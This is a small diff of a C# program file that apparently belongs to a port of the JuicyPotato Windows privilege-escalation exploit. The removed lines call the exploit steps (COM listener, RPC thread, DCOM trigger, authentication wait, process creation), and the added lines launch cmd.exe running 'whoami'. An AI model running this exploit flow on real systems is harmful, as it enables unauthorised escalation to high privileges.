@@ -1,16 +1,11 @@
 ﻿using System.Diagnostics;
 using sharp_potato;
 
-var sw = Stopwatch.StartNew();
-var potato = new JuicyPotato();
-potato.StartCOMListenerThread();
+var process = new SystemProcess();
+process.StartInfo.FileName = "cmd.exe";
+process.StartInfo.Arguments = "/K whoami";
 
-Console.Out.WriteLine("Trying CLSID...");
+process.Start();
+process.WaitForExit();
 
-potato.StartRPCConnectionThread();
-potato.TriggerDCOM();
-
-potato.WaitForAuth();
-
-Console.Out.WriteLine(sw.ElapsedMilliseconds + " ms");
-potato.CreateProcess();
+Console.Out.WriteLine("Exited");
